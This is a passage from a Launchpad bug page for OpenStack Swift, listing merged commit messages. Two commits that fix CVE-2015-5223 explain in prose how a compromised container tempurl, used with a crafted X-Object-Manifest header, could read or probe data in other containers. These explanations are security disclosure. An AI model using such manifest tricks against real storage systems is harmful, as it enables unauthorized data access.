                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-02T16:17:50.843183+00:00" title="2015-09-02 16:17:50 UTC">on 2015-09-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/32">
                <strong>Fix proposed to swift (feature/crypto)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: feature/crypto<br />
Review: <a rel="nofollow" href="https://review.openstack.org/219775">https:/<wbr />/review.<wbr />openstack.<wbr />org/219775</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: feature/crypto
Review: https://review.openstack.org/219775</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-03T01:18:10.015367+00:00" title="2015-09-03 01:18:10 UTC">on 2015-09-03</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/33">
                <strong>Related fix merged to swift (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/217273">https:/<wbr />/review.<wbr />openstack.<wbr />org/217273</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=58a10a5fffe<wbr />c69304d7bcce0f1<wbr />c43bd2a9f9ff52</a><br />
Submitter: Jenkins<br />
Branch:    master</p>
<p>commit 58a10a5fffec693<wbr />04d7bcce0f1c43b<wbr />d2a9f9ff52<br />
Author: Alistair Coles &lt;email address hidden&gt;<br />
Date:   Wed Aug 26 16:30:23 2015 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add test that a tempurl POST cannot set a DLO manifest header</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Follow up to [1] to add tests for tempurl POSTs not being allowed<br />
&nbsp;&nbsp;&nbsp;&nbsp;to set a DLO manifest header.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[1] I11e68830009d3f<wbr />6bff44ae4011a41<wbr />b67139146f6</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I7c0ad5a936f71e<wbr />56c599b8495a586<wbr />913d3334422<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: 1453948</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/217273
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Submitter: Jenkins
Branch:    master

commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Wed Aug 26 16:30:23 2015 +0100

    Add test that a tempurl POST cannot set a DLO manifest header
    
    Follow up to [1] to add tests for tempurl POSTs not being allowed
    to set a DLO manifest header.
    
    [1] I11e68830009d3f6bff44ae4011a41b67139146f6
    
    Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
    Related-Bug: 1453948
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-03T21:31:11.189348+00:00" title="2015-09-03 21:31:11 UTC">on 2015-09-03</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/34">
                <strong>Fix merged to swift (feature/crypto)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/swift/+bug/1453948/comments/34/+download">Download full text</a> (43.3 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/219775">https:/<wbr />/review.<wbr />openstack.<wbr />org/219775</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=257e468e9bf<wbr />d1088040419ad40<wbr />8106ac3c77b531</a><br />
Submitter: Jenkins<br />
Branch:    feature/crypto</p>
<p>commit e02609c66a80484<wbr />5672413b06830b8<wbr />7395afef31<br />
Author: Samuel Merritt &lt;email address hidden&gt;<br />
Date:   Tue Sep 1 15:19:50 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Preserve traceback in swift-dispersio<wbr />n-report</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Commit c690bcb fixed a bug in the dispersion report, but changed this<br />
&nbsp;&nbsp;&nbsp;&nbsp;from a bare &quot;raise&quot; to &quot;raise err&quot;, which loses the traceback. Not a<br />
&nbsp;&nbsp;&nbsp;&nbsp;big deal, but worth putting back IMO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id5b72153a4b8df<wbr />8e3faaf1fa3fb20<wbr />40e28ba85cc</p>
<p>commit d06d4ad0fd2dfe6<wbr />9da8008e7296512<wbr />64522c6c06<br />
Author: Minwoo Bae &lt;email address hidden&gt;<br />
Date:   Tue Sep 1 15:08:44 2015 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Included reference in swift.obj.diskfile to enumerate the string<br />
&nbsp;&nbsp;&nbsp;&nbsp;used for data file paths.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ie22caa678bc00d<wbr />fc43fabec7efbbb<wbr />9f34490f1b5</p>
<p>commit 524c89b7eeff037<wbr />b8a6b421888771e<wbr />15f98c2da2<br />
Author: John Dickinson &lt;email address hidden&gt;<br />
Date:   Fri Aug 21 13:39:41 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ic6301146b839c9<wbr />921bb85c4f4c1e5<wbr />85c9ab66661</p>
<p>commit 05de1305a903ee4<wbr />ce9c8c50fde53c5<wbr />52d5b90d51<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Thu Aug 27 18:35:09 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Make ssync_sender send valid chunked requests</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The connect method of ssync_sender tells the remote connection that it&#x27;s<br />
&nbsp;&nbsp;&nbsp;&nbsp;going to send a valid HTTP chunked request, but if the remote end needs<br />
&nbsp;&nbsp;&nbsp;&nbsp;to respond with an error of any kind sender throws HTTP right out the<br />
&nbsp;&nbsp;&nbsp;&nbsp;window, picks up his ball, and closes the socket down hard - much to the<br />
&nbsp;&nbsp;&nbsp;&nbsp;surprise of the eventlet.wsgi server who up to this point had been<br />
&nbsp;&nbsp;&nbsp;&nbsp;playing along quite nicely with this &#x27;SSYNC&#x27; nonsense assuming that<br />
&nbsp;&nbsp;&nbsp;&nbsp;everyone here is consenting mature adults.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;If you&#x27;re going to make a &quot;Transfer-Encoding: chunked&quot; request have the<br />
&nbsp;&nbsp;&nbsp;&nbsp;good decency to finish the job with a proper &#x27;0\r\n\r\n&#x27;. [1]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;N.B. It might be possible to handle an error status during the<br />
&nbsp;&nbsp;&nbsp;&nbsp;initialize_<wbr />request phase with some sort of 100-continue support, but<br />
&nbsp;&nbsp;&nbsp;&nbsp;honestly it&#x27;s not entirely clear to me when the server isn&#x27;t going to<br />
&nbsp;&nbsp;&nbsp;&nbsp;close the connection if the client is still expected to send the body<br />
&nbsp;&nbsp;&nbsp;&nbsp;[2] - further if the error comes later during missing_check or updates<br />
&nbsp;&nbsp;&nbsp;&nbsp;we&#x27;ll for sure want to send the chunk transfer termination line before<br />
&nbsp;&nbsp;&nbsp;&nbsp;we close down the socket and this way we cover both.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;1. Really, eventlet.wsgi shouldn&#x27;t be so blasted brittle about this [3]<br />
&nbsp;&nbsp;&nbsp;&nbsp;2. <a rel="nofollow" href="https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html">https:/<wbr />/lists.<wbr />w3.org/<wbr />Archives/<wbr />Public/<wbr />ietf-http-<wbr />wg/2005AprJun/<wbr />0007.html</a><br />
&nbsp;&nbsp;&nbsp;&nbsp;3. <a rel="nofollow" href="https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5">https:/<wbr />/github.<wbr />com/eventlet/<wbr />eventlet/<wbr />commit/<wbr />c3ce3eef0b4d0df<wbr />dbfb1ec0186d4bb<wbr />204fb8ecd5</a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-<a href="/bugs/1489587" class="bug-link">Bug #1489587</a><br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ic17c6c3075553f<wbr />8cf6ef6213e62a0<wbr />0282f0d01cf</p>
<p>commit 993ee4e37af1961<wbr />adba2047d5aa2eb<wbr />210e423eb3<br />
Author: nakagawamsa &lt;email address hidden&gt;<br />
Date:   Fri Aug 28 11:49:43 2015 +0900</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Remove duplicate X-Backend-<wbr />Storage-<wbr />Policy-<wbr />Index key</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;There is duplicate &#x27;X-Backend-<wbr />Storage-<wbr />Policy-<wbr />Index&#x27; dictionary key in unit.obj.<wbr />test_server.<wbr />py.<br />
&nbsp;&nbsp;&nbsp;&nbsp;One key has fixed policy index value, and another ha...</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/219775
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531
Submitter: Jenkins
Branch:    feature/crypto

commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Sep 1 15:19:50 2015 -0700

    Preserve traceback in swift-dispersion-report
    
    Commit c690bcb fixed a bug in the dispersion report, but changed this
    from a bare "raise" to "raise err", which loses the traceback. Not a
    big deal, but worth putting back IMO.
    
    Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae &lt;minwoob@us.ibm.com&gt;
Date:   Tue Sep 1 15:08:44 2015 -0500

    Included reference in swift.obj.diskfile to enumerate the string
    used for data file paths.
    
    Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Fri Aug 21 13:39:41 2015 -0700

    Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
    
    Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Aug 27 18:35:09 2015 -0700

    Make ssync_sender send valid chunked requests
    
    The connect method of ssync_sender tells the remote connection that it's
    going to send a valid HTTP chunked request, but if the remote end needs
    to respond with an error of any kind sender throws HTTP right out the
    window, picks up his ball, and closes the socket down hard - much to the
    surprise of the eventlet.wsgi server who up to this point had been
    playing along quite nicely with this 'SSYNC' nonsense assuming that
    everyone here is consenting mature adults.
    
    If you're going to make a "Transfer-Encoding: chunked" request have the
    good decency to finish the job with a proper '0\r\n\r\n'. [1]
    
    N.B. It might be possible to handle an error status during the
    initialize_request phase with some sort of 100-continue support, but
    honestly it's not entirely clear to me when the server isn't going to
    close the connection if the client is still expected to send the body
    [2] - further if the error comes later during missing_check or updates
    we'll for sure want to send the chunk transfer termination line before
    we close down the socket and this way we cover both.
    
    1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
    2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
    3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
    
    Closes-Bug #1489587
    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa &lt;nakagawamsa@nttdata.co.jp&gt;
Date:   Fri Aug 28 11:49:43 2015 +0900

    Remove duplicate X-Backend-Storage-Policy-Index key
    
    There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test_server.py.
    One key has fixed policy index value, and another has random value.
    Unittest should done with random policy index, so remove key which is set fixed value.
    
    Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3

commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse &lt;paul.e.luse@intel.com&gt;
Date:   Wed Aug 12 13:32:50 2015 -0700

    EC GET path: require fragments to be of same set
    
    And if they are not, exhaust the node iter to go get more.  The
    problem without this implementation is a simple overwrite where
    a GET follows before the handoff has put the newer obj back on
    the 'alive again' node such that the proxy gets n-1 fragments
    of the newest set and 1 of the older.
    
    This patch bucketizes the fragments by etag and if it doesn't
    have enough continues to exhaust the node iterator until it
    has a large enough matching set.
    
    Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    Co-Authored-By: Alistair Coles &lt;alistair.coles@hp.com&gt;
    Closes-Bug: 1457691

commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Aug 11 09:10:13 2015 -0500

    Better scoping for tempurls, especially container tempurls
    
    It used to be that a GET of a tempurl referencing a large object would
    let you download that large object regardless of where its segments
    lived. However, this led to some violated user expectations around
    container tempurls.
    
    (Note on shorthand: all tempurls reference objects. However, "account
    tempurl" and "container tempurl" are shorthand meaning tempurls
    generated using a key on the account or container, respectively.)
    
    Let's say an application is given tempurl keys to a particular
    container, and it does all its work therein using those keys. The user
    expects that, if the application is compromised, then the attacker
    only gains access to the "compromised-container". However, with the old
    behavior, the attacker could read data from *any* container like so:
    
    1) Choose a "victim-container" to download
    
    2) Create PUT and GET tempurl for any object name within the
       "compromised-container". The object doesn't need to exist;
       we'll create it.
    
    3) Using the PUT tempurl, upload a DLO manifest with
       "X-Object-Manifest: /victim-container/"
    
    4) Using the GET tempurl, download the object created in step 3. The
       result will be the concatenation of all objects in the
       "victim-container".
    
    Step 3 need not be for all objects in the "victim-container"; for
    example, a value "X-Object-Manifest: /victim-container/abc" would only
    be the concatenation of all objects whose names begin with "abc". By
    probing for object names in this way, individual objects may be found
    and extracted.
    
    A similar bug would exist for manifests referencing other accounts
    except that neither the X-Object-Manifest (DLO) nor the JSON manifest
    document (SLO) have a way of specifying a different account.
    
    This change makes it so that a container tempurl only grants access to
    objects within its container, *including* large-object segments. This
    breaks backward compatibility for container tempurls that may have
    pointed to cross container *LO's, but (a) there are security
    implications, and (b) container tempurls are a relatively new feature.
    
    This works by having the tempurl middleware install an authorization
    callback ('swift.authorize' in the WSGI environment) that limits the
    scope of any requests to the account or container from which the key
    came.
    
    This requires swift.authorize to persist for both the manifest request
    and all segment requests; this is done by having the proxy server
    restore it to the WSGI environment prior to returning from __call__.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Clay Gerrard &lt;clayg@swiftstack.com&gt;
    Co-Authored-By: Alistair Coles &lt;alistair.coles@hp.com&gt;
    Co-Authored-By: Christian Schwede &lt;cschwede@redhat.com&gt;
    Co-Authored-By: Matthew Oliver &lt;matt@oliver.net.au&gt;
    
    Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
    Closes-Bug: 1449212

commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 22:36:21 2015 -0700

    Disallow unsafe tempurl operations to point to unauthorized data
    
    Do not allow PUT tempurls to create pointers to other data. Specifically
    disallow the creation of DLO object manifests by returning an error if a
    non-safe tempurl request includes an X-Object-Manifest header regardless of
    the value of the header.
    
    This prevents discoverability attacks which can use any PUT tempurl to probe
    for private data by creating a DLO object manifest and then using the PUT
    tempurl to head the object which would 404 if the prefix does not match any
    object data or form a valid DLO HEAD response if it does.
    
    This also prevents a tricky and potentially unexpected consequence of PUT
    tempurls which would make it unsafe to allow a user to download objects
    created by tempurl (even if they just created them) because the result of
    reading the object created via tempurl may not be the data which was uploaded.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    
    Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
    Closes-Bug: 1453948

commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA &lt;miyahara.kazuhiro@lab.ntt.co.jp&gt;
Date:   Mon Aug 17 16:50:56 2015 +0900

    Fix dispersion-reports error message
    
    This patch fixes Swift to show message
    "No objects to query. Has swift-dispersion-populate been run?"
    for "swift-dispersion-report —object-only”
    with no container for object dispersion.
    
    Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
    Closes-Bug: #1468120

commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad &lt;tushar.gohad@intel.com&gt;
Date:   Tue Aug 18 07:24:19 2015 +0000

    Restrict PyECLib version to 1.0.7
    
    v1.0.9 rev of PyECLib replaces Jerasure with a native EC
    implementation (liberasurecode_rs_vand) as the default
    EC scheme.  Going forward, Jerasure will not be bundled
    with PyPI version of PyECLib as it used to be, until
    v1.0.7.
    
    This is an interim change to Swift requirements until we
    get v1.0.9 PyECLib included into global-requirements and
    ready patches that change Swift default ec_type (for doc,
    config samples and unit tests) from "jerasure_rs_vand"
    to "liberasurecode_rs_vand."
    
    Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4

commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Mon Jul 6 13:21:40 2015 -0700

    Fix EC GET backend stream iteration state
    
    In EC case, When GET object requested, proxy-server always makes a log
    line "Client disconnected on read" even though the request succeeded.
    
    That is because ECAppIter class doesn't maintain a bunch of backend
    stream when closing the app_iter. It will cause unfortunately
    GeneratorExit on backend stream ResumingGetter.
    
    This patch fixes to set non_client_disconnected to propagate the state
    to the backend streams when the range iteration stopped successful.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
    Closes-Bug: #1472201

commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Tue Aug 25 11:05:41 2015 +0100

    Fix swob.Range docstring
    
    Bad ranges cause a ValueError to be raised, not an empty
    ranges list.
    
    Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed

commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Mon Aug 24 23:11:34 2015 -0700

    Allow pep8 of a single file
    
    Now you can run
    
       $ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
    
    to run pep8 against just those files[1]. This is quite a bit faster
    than a full pep8 run, and the faster feedback is nice when you're
    fiddling with some formatting to placate pep8.
    
    Of course, you can still run "tox -e pep8" to check the whole source
    tree, just as before this commit.
    
    [1] It'll still run against bin/swift* as well, but that's still a lot
    faster than running against all our .py files.
    
    Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502

commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver &lt;matt@oliver.net.au&gt;
Date:   Tue Aug 25 11:24:49 2015 +1000

    Follow up patch to fix a multiline import NITPIC
    
    This change cleans up test/unit/obj/test_replicator.py's imports
    to use only 1 version of multiline import syntaxes (' \' vs '()').
    I don't really mind which, but we should be consistant, at least
    in the same file.
    
    This is a follow up for patch 215857.
    
    Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5

commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai &lt;osanai.hisashi@jp.fujitsu.com&gt;
Date:   Tue Aug 25 07:52:18 2015 +0900

    Fix typo of a comment in replicator
    
    The typo was introduced by patch 138342 (sorry) so I fix it.
    
    Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e

commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke &lt;tim.burke@gmail.com&gt;
Date:   Mon Aug 24 20:36:22 2015 +0000

    Fix use of delimiter in account listings
    
    Previously, account listings that used the delimiter query param could
    omit some containers if they ended with the character that follows the
    delimiter.
    
    See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
    for container listings.
    
    Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e

commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Aug 21 18:14:55 2015 -0700

    Use correct Storage-Policy header for REPLICATE requests
    
    Under some concurrency the object-replicator could potentially send the
    wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
    replication if there were multiple storage policies on the same node
    because of a race where multiple jobs being processed concurrently would
    mutate some shared state on the ObjectReplicator instance.
    
    Instead of using shared stated on the ObjectReplicator instance when
    mutating the default headers send with REPLICATION requests each job
    will copy them into a local where they can safely be updated.
    
    Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd

commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Fri May 15 06:44:12 2015 -0700

    eventlet.posthook related code needn't anymore
    
    In the past, older Swift seemed to use eventlet.posthooks scheme for the
    logging on proxy with posthooklogger method. However, for now, Swift
    attaches no method to eventlet.posthooks everywhere so we don't have
    to maintain the posthooks anymore.
    
    Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c

commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Wed May 13 00:43:59 2015 -0700

    Fix the missing SLO state on fast-post
    
    When using fast-post and POST (i.e. metadata update) is requested to
    a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
    header from the existing metadata. It results in breaking the SLO
    state because the manifest missing the 'X-Static-Large-Object' metadata
    will be maintained as a normal files.
    
    This patch fixes object-server to keep the existing
    'X-Static-Large-Object' flag and then keep the SLO state.
    
    Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
    Closes-bug: #1453807

commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom &lt;eranr@il.ibm.com&gt;
Date:   Tue Jul 28 09:41:12 2015 +0300

    Add container sync probe test to SAIO default set
    
    SAIO Configuration and documentation changes enabling to run the
    container sync probe test by default
    
    Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
    Related-Bug: #1476623

commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Aug 21 14:04:46 2015 -0700

    Minor cleanup handoff mode warnings
    
      * message is a little clearer
      * test is a little stronger
    
    Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e

commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna &lt;ccavanna@ca.ibm.com&gt;
Date:   Fri Aug 21 14:14:31 2015 -0400

    New troubleshooting case in documentation.
    
    Added a new troubleshooting case for the "First Contribution to Swift"
    documentation page.
    
    Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0

commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh &lt;pradeep.singh@nectechnologies.in&gt;
Date:   Tue Jul 14 10:03:18 2015 +0530

    Emit warning log in object replicator
    
    When the object-replicator encounters handoffs_first and
    handoff_delete options as enabled it should emit a log
    warning indicating that it should be changed back to the
    default before the next "normal" rebalance.
    
    Closes-Bug: #1457262
    
    Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0

commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Thu Aug 20 13:24:38 2015 -0700

    Fix 500 for bogus Range request to 0-byte object.
    
    The proxy was trying to pop a byterange off a Range header that didn't
    contain syntactically-valid byteranges. This worked about as well as
    you'd expect. Now we detect the bogus value and remove the header
    entirely.
    
    Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810

commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai &lt;takaiak@nttdata.co.jp&gt;
Date:   Thu Aug 20 18:40:52 2015 +0900

    Fix the comment in [1].
    
    (line 259) parameter(op) of object_update method is 'PUT' or
    'DELETE' not 'POST' or 'DELETE'.
    
    [1]: swift/obj/updater.py
    
    Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160

commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 28 20:35:25 2015 +0530

    test/(functional/probe):Replace python print operator with print function (pep H233, py33)
    
    'print' function is compatible with 2.x and 3.x python versions
    Link : https://www.python.org/dev/peps/pep-3105/
    
    Python 2.6 has a __future__ import that removes print as language syntax,
    letting you use the functional form instead
    
    Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58

commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Wed Aug 19 10:42:28 2015 -0700

    Add OpenStack release names to changelog
    
    I can never remember the mapping of real version numbers to the
    OpenStack names.
    
    Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab

commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 11:18:49 2015 +0200

    pep8: Don't override '_' symbol
    
    Fix pep8 warning F402 "import '_' from line 51 shadowed by loop
    variable".
    
    Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5

commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
